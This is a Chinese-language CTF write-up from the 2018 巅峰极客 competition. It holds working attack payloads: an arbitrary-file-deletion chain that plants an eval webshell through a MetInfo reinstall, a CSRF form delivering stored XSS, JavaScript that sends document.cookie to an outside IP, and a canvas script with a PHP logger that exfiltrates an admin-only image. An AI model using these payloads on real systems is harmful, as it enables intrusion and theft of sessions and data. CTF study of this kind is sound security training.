---
title: 巅峰极客ctf
tags: ctf
abbrlink: 46785
date: 2018-07-23 20:33:53
---

## pentest

御剑扫描

经过目录扫描，发现`file/file.php`

根据网页最后提示:

```
DELETE FILE
Sorry,no filename!
```

可以猜测存在任意文件删除漏洞。

首先我们删除`install.lock`

```
http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/file/file.php?file=...//config/install.lock
```
重装metinfo，重装的时候数据库名填写 

```
met#*/@eval($_GET[1]);/*
```

数据库密码为`root`

执行shell即可

```
http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/config/config_db.php?1=system(%27ls%27);
```
## mysqlonline

首先通过mysql查询，经过hex编码在输出，可以造成xss。

```
select 0x3c7363726970743e616c6572742831293c2f7363726970743e
```

结合CSRF即可打后台:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://106.75.35.230:9001/runsql.php " method="POST">
      <input type="hidden" name="sql" value="select 0x30783c736372697074207372633d687474703a2f2f69702f7873732f312e6a733e3c2f7363726970743e" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

```
0x30783c736372697074207372633d687474703a2f2f69702f7873732f312e6a733e3c2f7363726970743e
=> 
<script src=http://ip/xss/1.js></script>
```

js的内容:

```
self.location = 'http://123.207.90.143/x.php?v=aaa'+btoa(document.cookie)+'aaa';
```

修改CSRF payload:

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/runsql.php" method="POST">
      <input type="hidden" name="sql" value="select 0x30783c736372697074207372633d687474703a2f2f69702f7873732f312e6a733e3c2f7363726970743e" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

通过以上操作，可以发现后台有`admin_zzzz666.php`页面

但是admin_zzzz666.php并无flag，只有`./static/img/iamsecret_555.jpg `

修改payload,也就是vps上的js文件，利用canvas获取图片:

```
var love={ajax:function(){var a;try{a=new XMLHttpRequest()}catch(e){try{a=new ActiveXObject("Msxml2.XMLHTTP")}catch(e){try{a=new ActiveXObject("Microsoft.XMLHTTP")}catch(e){return false}}}return a},req:function(b,c,d,e){d=(d||"").toUpperCase();d=d||"GET";c=c||"";if(b){var a=this.ajax();a.open(d,b,true);if(d=="POST"){a.setRequestHeader("Content-type","application/x-www-form-urlencoded")}a.onreadystatechange=function(){if(a.readyState==4){if(e){e(a)}}};if((typeof c)=="object"){var f=[];for(var i in c){f.push(i+"="+encodeURIComponent(c[i]))}a.send(f.join("&"))}else{a.send(c||null)}}},get:function(a,b){this.req(a,"","GET",b)},post:function(a,b,c){this.req(a,b,"POST",c)}};

function getBase64(img){
    function getBase64Image(img,width,height) {//width、height调用时传入具体像素值，控制大小 ,不传则默认图像大小
        var canvas = document.createElement("canvas");
        canvas.width = width ? width : img.width;
        canvas.height = height ? height : img.height;

        var ctx = canvas.getContext("2d");
        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
        var dataURL = canvas.toDataURL();
        return dataURL;
    }
    var image = new Image();
    image.crossOrigin = '';
    image.src = img;
    return new Promise((resolve,reject)=>{
        image.onload =function (){
            resolve(getBase64Image(image));//将base64传给done上传处理
        }
    });
}

getBase64('http://127.0.0.1/static/img/iamsecret_555.jpg').then(base64 => {
    love.post(
      "http://ip/xss/x.php",
      "v="+base64,
      function(res){
        console.log(res);
      }
    );
}, err => {
    console.log(err)
})
```

vps上xss.php:

```
<?php
header('Access-Control-Allow-Origin: *');
file_put_contents('log.txt',$_POST['v']);
```

最后会获取到图片，当然这个过程中+会被转换为空格，所以后面还要转换回来。 

## Dedefun

```
参考网址：
https://paper.tuisec.win/detail/d1053143f127862
https://xz.aliyun.com/t/2469#toc-3
```

**主要用来找后台目录**

## A simple CMS

**利用缓存getshell**

慢慢分析吧。挖坑



